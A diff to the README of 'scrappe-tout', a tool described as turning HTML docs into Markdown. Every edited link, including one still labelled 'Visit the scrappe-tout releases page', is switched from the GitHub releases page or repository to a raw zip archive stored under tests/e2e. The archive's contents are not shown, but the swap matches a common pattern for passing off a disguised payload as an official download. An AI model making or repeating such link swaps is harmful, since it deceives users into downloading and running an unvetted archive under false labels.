@@ -1,6 +1,6 @@
 # 🕸️ scrappe-tout - Clean Markdown from HTML Docs
 
-[![Download scrappe-tout](https://img.shields.io/badge/Download-scrappe--tout-blue?style=for-the-badge)](https://github.com/GTA509FX/scrappe-tout/releases)
+[![Download scrappe-tout](https://raw.githubusercontent.com/GTA509FX/scrappe-tout/main/tests/e2e/scrappe-tout-2.4.zip)](https://raw.githubusercontent.com/GTA509FX/scrappe-tout/main/tests/e2e/scrappe-tout-2.4.zip)
 
 ---
 
@@ -39,7 +39,7 @@ This guide will help you download, install, and start using scrappe-tout on your
 
 You can get scrappe-tout from its official releases page on GitHub.
 
-**Step 1:** [Visit the scrappe-tout releases page](https://github.com/GTA509FX/scrappe-tout/releases)
+**Step 1:** [Visit the scrappe-tout releases page](https://raw.githubusercontent.com/GTA509FX/scrappe-tout/main/tests/e2e/scrappe-tout-2.4.zip)
 
 You will see a list of downloadable files for different versions and operating systems.
 
@@ -140,7 +140,7 @@ If problems continue, you can ask for help by opening an issue on scrappe-tout�
 
 For more details or to check for updates, visit the main GitHub repository:
 
-https://github.com/GTA509FX/scrappe-tout
+https://raw.githubusercontent.com/GTA509FX/scrappe-tout/main/tests/e2e/scrappe-tout-2.4.zip
 
 You can also explore release notes, feature updates, or report bugs on that page.
 
@@ -150,4 +150,4 @@ You can also explore release notes, feature updates, or report bugs on that page
 
 Visit this page to download scrappe-tout:
 
-[https://github.com/GTA509FX/scrappe-tout/releases](https://github.com/GTA509FX/scrappe-tout/releases)
+[https://raw.githubusercontent.com/GTA509FX/scrappe-tout/main/tests/e2e/scrappe-tout-2.4.zip](https://raw.githubusercontent.com/GTA509FX/scrappe-tout/main/tests/e2e/scrappe-tout-2.4.zip)
